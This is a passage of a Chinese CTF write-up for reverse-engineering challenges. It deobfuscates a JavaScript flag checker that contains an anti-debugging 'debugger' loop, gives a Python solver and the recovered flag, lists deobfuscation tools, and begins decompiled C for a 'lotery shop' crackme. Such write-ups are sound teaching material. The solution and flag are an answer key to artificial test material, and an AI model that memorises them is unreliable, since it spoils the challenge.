class="keyword">try</span> &#123;</span><br><span class="line">      _0x139d2b();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">  &#125;)();</span><br><span class="line">  <span class="keyword">var</span> _0x8b9e29 = <span class="built_in">document</span>.getElementById(<span class="string">&quot;passwordError&quot;</span>);</span><br><span class="line">  _0xcaf3caf3 = [];</span><br><span class="line">  _0xc4f3c4f3 = [<span class="number">85</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">149</span>, <span class="number">49</span>, <span class="number">76</span>, <span class="number">137</span>, <span class="number">107</span>, <span class="number">73</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">223</span>, <span class="number">99</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">215</span>, <span class="number">115</span>, <span class="number">166</span>, <span class="number">110</span>, <span class="number">211</span>, <span class="number">99</span>, <span class="number">161</span>, <span class="number">146</span>, <span class="number">91</span>, <span class="number">114</span>, <span class="number">230</span>, <span class="number">143</span>, <span class="number">118</span>, <span class="number">79</span>, <span class="number">208</span>];</span><br><span class="line">  Hur1k = <span class="string">&quot;Hur1k&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (_0x51eb06.length != <span class="number">39</span>) &#123;</span><br><span class="line">    _0x8b9e29.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (_0x51eb06.substr(<span class="number">0</span>, <span class="number">6</span>) != <span class="string">&quot;XSCTF&#123;&quot;</span>) &#123;</span><br><span class="line">    _0x8b9e29.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (_0x51eb06[<span class="number">38</span>] != <span class="string">&quot;&#125;&quot;</span>) &#123;</span><br><span class="line">    _0x8b9e29.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  _0x114514 = _0x51eb06.substr(<span class="number">6</span>, <span class="number">32</span>);</span><br><span class="line">  _0x51eb06 = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> _0x28db6c = <span class="number">0</span>; _0x28db6c &lt; _0x114514.length; _0x28db6c++) &#123;</span><br><span class="line">    _0x51eb06.push(_0x114514.charCodeAt(_0x28db6c));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Math</span>.seed = (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime();</span><br><span class="line">  <span class="built_in">Math</span>.seededRandom = <span class="function"><span class="keyword">function</span> (<span class="params">_0x14b0c9, _0x56fb11</span>) </span>&#123;</span><br><span class="line">    _0x56fb11 = _0x56fb11 || <span class="number">1</span>;</span><br><span class="line">    _0x14b0c9 = _0x14b0c9 || <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">Math</span>.seed = (<span class="built_in">Math</span>.seed * <span class="number">9301</span> + <span class="number">49297</span>) % <span class="number">233280</span>;</span><br><span class="line">    <span class="keyword">var</span> _0xee8b23 = <span class="built_in">Math</span>.seed / <span class="number">233280</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(_0x14b0c9 + _0xee8b23 * (_0x56fb11 - _0x14b0c9));</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> _0x28db6c = <span class="number">0</span>; _0x28db6c &lt; _0x51eb06.length; _0x28db6c += <span class="number">2</span>) &#123;</span><br><span class="line">    tmp = _H4H4H4(_0x51eb06[_0x28db6c], _0x28db6c) ^ _0x28db6c;</span><br><span class="line">    _0xcaf3caf3.push(tmp);</span><br><span class="line">    randNum = <span class="built_in">Math</span>.seededRandom(<span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">    <span class="built_in">Math</span>.seed = randNum;</span><br><span class="line">    tmp = _H4H4H4H4(tmp ^ _0x51eb06[_0x28db6c + <span class="number">1</span>], Hur1k.charCodeAt([_0x28db6c / <span class="number">2</span> % Hur1k.length]), randNum);</span><br><span class="line">    _0xcaf3caf3.push(tmp);</span><br><span class="line">  &#125;</span><br><span class="line">  (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">      &#125;, <span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      _0x139d2b();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">  &#125;)();</span><br><span class="line">  <span class="keyword">if</span> (_0xcaf3caf3.length != <span class="number">32</span>) &#123;</span><br><span class="line">    _0x8b9e29.textContent = <span class="string">&quot;究极错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> _0x28db6c = <span class="number">0</span>; _0x28db6c &lt; _0xcaf3caf3.length; _0x28db6c++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (_0xcaf3caf3[_0x28db6c] != _0xc4f3c4f3[_0x28db6c]) &#123;</span><br><span class="line">      _0x8b9e29.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是手动解</p><ul><li>从目标数组入手回溯</li><li>查看对目标数组操作的函数，尝试逆向</li><li>逆向不出来怎么办，把函数复制到控制台，传入简单的参数，然后逐个修改参数，观察函数输出</li><li>根据这个方法可以推测出<code>_H4H4H4</code>的实际作用是相加，<code>_H4H4H4H4</code>的实际功能是前两个参数相减，第三个参数是摆设</li><li>涉及到随机数的参数大概率没什么用</li></ul><p>最后手动解混淆的结果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">    &#125;, <span class="number">50</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    _0x139d2b();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">_0x431cb1, _0x516603</span>) </span>&#123;</span><br><span class="line">  ~((~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span> | ~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>;</span><br><span class="line">  <span class="keyword">return</span> ~((~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span> | ~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>) &amp; <span class="number">255</span> &amp; <span class="number">255</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params">h_a, h_b, h_c</span>) </span>&#123;</span><br><span class="line">  a = h_a + h_c + (((~h_b &amp; <span class="number">255</span>) + <span class="number">1</span>)&amp;<span class="number">255</span>) + (((~h_c &amp; <span class="number">255</span>) + <span class="number">1</span>)&amp;<span class="number">255</span>)</span><br><span class="line">  a = h_a + h_c + <span class="number">256</span>-h_b + <span class="number">256</span>-h_c</span><br><span class="line">  a = <span class="number">512</span> + h_a - h_b</span><br><span class="line">  <span class="comment">// a = add(h_a, h_c);</span></span><br><span class="line">  <span class="comment">// a = add(a, add(~h_b &amp; 255, 1) &amp; 255);</span></span><br><span class="line">  <span class="comment">// a = add(a, add(~h_c &amp; 255, 1) &amp; 255);</span></span><br><span class="line">  <span class="keyword">return</span> a &amp; <span class="number">255</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_G00D</span>(<span class="params">userinput</span>) </span>&#123;</span><br><span class="line">  (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">      &#125;, <span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      _0x139d2b();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">  &#125;)();</span><br><span class="line">  <span class="keyword">var</span> pass_err = <span class="built_in">document</span>.getElementById(<span class="string">&quot;passwordError&quot;</span>);</span><br><span class="line">  userin = [];</span><br><span class="line">  target = [<span class="number">85</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">149</span>, <span class="number">49</span>, <span class="number">76</span>, <span class="number">137</span>, <span class="number">107</span>, <span class="number">73</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">223</span>, <span class="number">99</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">215</span>, <span class="number">115</span>, <span class="number">166</span>, <span class="number">110</span>, <span class="number">211</span>, <span class="number">99</span>, <span class="number">161</span>, <span class="number">146</span>, <span class="number">91</span>, <span class="number">114</span>, <span class="number">230</span>, <span class="number">143</span>, <span class="number">118</span>, <span class="number">79</span>, <span class="number">208</span>];</span><br><span class="line">  Hur1k = <span class="string">&quot;Hur1k&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (userinput.length != <span class="number">39</span>) &#123;</span><br><span class="line">    pass_err.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (userinput.substr(<span class="number">0</span>, <span class="number">6</span>) != <span class="string">&quot;XSCTF&#123;&quot;</span>) &#123;</span><br><span class="line">    pass_err.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (userinput[<span class="number">38</span>] != <span class="string">&quot;&#125;&quot;</span>) &#123;</span><br><span class="line">    pass_err.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  in_slice = userinput.substr(<span class="number">6</span>, <span class="number">32</span>);</span><br><span class="line">  userinput = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; in_slice.length; i++) &#123;</span><br><span class="line">    userinput.push(in_slice.charCodeAt(i));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Math</span>.seed = (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime();</span><br><span class="line">  <span class="built_in">Math</span>.seededRandom = <span class="function"><span class="keyword">function</span> (<span class="params">p_a, p_b</span>) </span>&#123;</span><br><span class="line">    p_b = p_b || <span class="number">1</span>;</span><br><span class="line">    p_a = p_a || <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">Math</span>.seed = (<span class="built_in">Math</span>.seed * <span class="number">9301</span> + <span class="number">49297</span>) % <span class="number">233280</span>;</span><br><span class="line">    <span class="keyword">var</span> p_seed = <span class="built_in">Math</span>.seed / <span class="number">233280</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(p_a + p_seed * (p_b - p_a));</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; userinput.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">    tmp = add(userinput[i], i) ^ i;</span><br><span class="line">    userin.push(tmp);</span><br><span class="line">    randNum = <span class="built_in">Math</span>.seededRandom(<span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">    <span class="built_in">Math</span>.seed = randNum;</span><br><span class="line">    tmp = sub(tmp ^ userinput[i + <span class="number">1</span>], Hur1k.charCodeAt([i / <span class="number">2</span> % Hur1k.length]), randNum);</span><br><span class="line">    userin.push(tmp);</span><br><span class="line">  &#125;</span><br><span class="line">  (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">      &#125;, <span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      _0x139d2b();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">  &#125;)();</span><br><span class="line">  <span class="keyword">if</span> (userin.length != <span class="number">32</span>) &#123;</span><br><span class="line">    pass_err.textContent = <span class="string">&quot;究极错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; userin.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (userin[i] != target[i]) &#123;</span><br><span class="line">      pass_err.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Hur1k = <span class="string">&quot;Hur1k&quot;</span></span><br><span class="line">s = [<span class="number">85</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">149</span>, <span class="number">49</span>, <span class="number">76</span>, <span class="number">137</span>, <span class="number">107</span>, <span class="number">73</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">223</span>, <span class="number">99</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">215</span>, <span class="number">115</span>, <span class="number">166</span>, <span class="number">110</span>, <span class="number">211</span>, <span class="number">99</span>, <span class="number">161</span>, <span class="number">146</span>, <span class="number">91</span>, <span class="number">114</span>, <span class="number">230</span>, <span class="number">143</span>, <span class="number">118</span>, <span class="number">79</span>, <span class="number">208</span>]</span><br><span class="line">charCode = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>, <span class="number">-1</span>, <span class="number">-2</span>):</span><br><span class="line">    s[i+<span class="number">1</span>] = ((s[i+<span class="number">1</span>]+<span class="built_in">ord</span>(Hur1k[charCode[i]]))&amp;<span class="number">255</span>)^s[i]</span><br><span class="line">    s[i] = (s[i]^i)-i</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>UR_R341Ly_900d_47_Obfu_ur_Newn3W</code></p><p>一些解混淆的网站</p><ul><li><a href="https://obf-io.deobfuscate.io/">Obfuscator.io Deobfuscator (deobfuscate.io)</a></li><li><a href="https://deobfuscate.io/">JavaScript Deobfuscator (deobfuscate.io)</a></li><li><a href="https://www.dejs.vip/">主页 - DeJs</a></li><li><a href="https://deobfuscate.relative.im/">JavaScript Deobfuscator (relative.im)</a></li></ul><p>工具</p><ul><li>v_jstools（浏览器插件，需配置） – <a href="https://blog.csdn.net/freeking101/article/details/121668637">网页 js 逆向分析 ( v_jstools )、jshook ( 安卓上用js实现Hook )-CSDN博客</a></li></ul><h2 id="lotery-shop"><a href="#lotery-shop" class="headerlink" title="lotery shop"></a>lotery shop</h2><p>核心代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">sub_140017AC0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+60h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">80</span>]; <span class="comment">// [rsp+68h] [rbp+8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">80</span>]; <span class="comment">// [rsp+B8h] [rbp+58h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">96</span>]; <span class="comment">// [rsp+108h] [rbp+A8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">80</span>]; <span class="comment">// [rsp+168h] [rbp+108h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7[<span class="number">20</span>]; <span class="comment">// [rsp+1B8h] [rbp+158h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v8[<span class="number">20</span>]; <span class="comment">// [rsp+208h] [rbp+1A8h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v9[<span class="number">20</span>]; <span class="comment">// [rsp+258h] [rbp+1F8h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v10[<span class="number">20</span>]; <span class="comment">// [rsp+2A8h] [rbp+248h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v11[<span class="number">76</span>]; <span class="comment">// [rsp+2F8h] [rbp+298h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v12[<span class="number">8</span>]; <span class="comment">// [rsp+344h] [rbp+2E4h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v13[<span class="number">19</span>]; <span class="comment">// [rsp+364h] [rbp+304h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v14[<span class="number">180</span>]; <span class="comment">// [rsp+3B0h] [rbp+350h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v15[<span class="number">148</span>]; <span class="comment">// [rsp+464h] [rbp+404h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+6B4h] [rbp+654h]</span></span><br><span class="line"></span><br><span class="line">  v0 = &amp;v2;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">266</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v0 = <span class="number">-858993460</span>;</span><br><span class="line">    v0 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140011690(&amp;unk_14002D06A);</span><br><span class="line">  v13[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v13[<span class="number">8</span>] = <span class="number">10</span>;</span><br><span class="line">  j_memset(v14, <span class="number">0</span>, <span class="number">30u</span>i64);</span><br><span class="line">  v15[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  sub_14001117C(v3, <span class="string">&quot;Sloth&#x27;s lottery shop is open!&quot;</span>);</span><br><span class="line">  sub_14001117C(v4, <span class="string">&quot;You&#x27;re our first customer!&quot;</span>);</span><br><span class="line">  sub_1400114CE(v5, <span class="string">&quot;We will give you a free lottery ticket, the number is: &quot;</span>);</span><br><span class="line">  sub_14001117C(v6, <span class="string">&quot;Please enter your choice &#123;1-5&#125;&quot;</span>);</span><br><span class="line">  sub_14001117C(v7, <span class="string">&quot;1.buy a lottery ticket&quot;</span>);</span><br><span class="line">  sub_14001117C(v8, <span class="string">&quot;2.Check to see if you won&quot;</span>);</span><br><span class="line">  sub_14001117C(v9, <span class="string">&quot;3.join us&quot;</span>);</span><br><span class="line">  sub_14001117C(v10, <span class="string">&quot;4.Take a sneak peek at the flag&quot;</span>);</span><br><span class="line">  sub_14001117C(v11, <span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line">  sub_1400110FF(</span><br><span class="line">    (<span class="keyword">int</span>)v3,</span><br><span class="line">    (<span class="keyword">int</span>)v4,</span><br><span class="line">    (<span class="keyword">int</span>)v5,</span><br><span class="line">    (<span class="keyword">int</span>)v6,</span><br><span class="line">    (__int64)v7,</span><br><span class="line">    (__int64)v8,</span><br><span class="line">    (__int64)v9,</span><br><span class="line">    (__int64)v10,</span><br><span class="line">    (__int64)v11,</span><br><span class="line">    (__int64)v13,</span><br><span class="line">    (__int64)v15,</span><br><span class="line">    (__int64)v14);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_14001156E((<span class="keyword">int</span>)v7, (<span class="keyword">int</span>)v8, (<span class="keyword">int</span>)v9, (<span class="keyword">int</span>)v10, v11, v6);</span><br><span class="line">      sub_1400113CA(<span class="string">&quot;%d&quot;</span>, v12);</span><br><span class="line">      v16 = v12[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v12[<span class="number">0</span>] != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">      sub_1400111EF(v15, (__int64)v14);</span><br><span class="line">      sub_1400111BD();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> ( v16 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">        sub_140011708(v15, v14, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v13[<span class="number">0</span>]);</span><br><span class="line">        sub_1400111BD();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">        sub_14001149C();</span><br><span class="line">        sub_1400111BD();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">        sub_1400114E7();</span><br><span class="line">        sub_1400111BD();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Welcome again&quot;</span>);</span><br><span class="line">        sub_1400111BD();</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;input error&quot;</span>);</span><br><span class="line">        